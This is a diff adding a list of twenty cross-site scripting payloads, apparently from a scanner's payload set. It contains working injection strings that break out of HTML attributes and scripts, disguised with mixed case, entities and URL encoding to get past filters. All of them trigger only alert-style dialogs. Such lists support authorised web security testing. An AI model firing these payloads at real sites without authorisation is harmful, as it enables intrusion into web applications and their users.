@@ -1,0 +1,20 @@
+\"><SvG/onload=alert(1) id=xss>
+\"><Svg/onload=alert(1) class=xss>
+'><sVg/onload=alert(1) id=xss>
+'><sVg/onload=alert(1) class=xss>
+</ScriPt><sCripT id=xss>alert(1)</sCriPt>
+</ScriPt><sCripT class=xss>alert(1)</sCriPt>
+\"><a href=javas&#99;ript:alert(1)/class=xss>click
+'><a href=javas&#99;ript:alert(1)/class=xss>click
+'><svg/class='xss'onLoad=alert(1)>
+\"><d3\"<\"/onclick=\"1 class=xss>[confirm``]\"<\">z
+\"><w=\"/x=\"y>\"/class=xss/ondblclick=`<`[confir\u006d``]>z
+\"><iFrAme/src=jaVascRipt:alert(1) class=xss></iFramE>
+\"><svg/class=\"dalfox\"onLoad=alert(1)>
+\"><svg/OnLoad=\"`${prompt``}`\" class=xss>
+'\"><img/src/onerror=.1|alert`` class=xss>
+\"><img/src/onerror=.1|alert`` class=xss>
+'><img/src/onerror=.1|alert`` class=xss>
+'\"><svg/class=xss onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+</script><svg><script/class=xss>alert(1)</script>-%26apos;
+%22%3E%3Csvg%2Fclass%3D%22xss%22onLoad%3Dalert%2845%29%3E
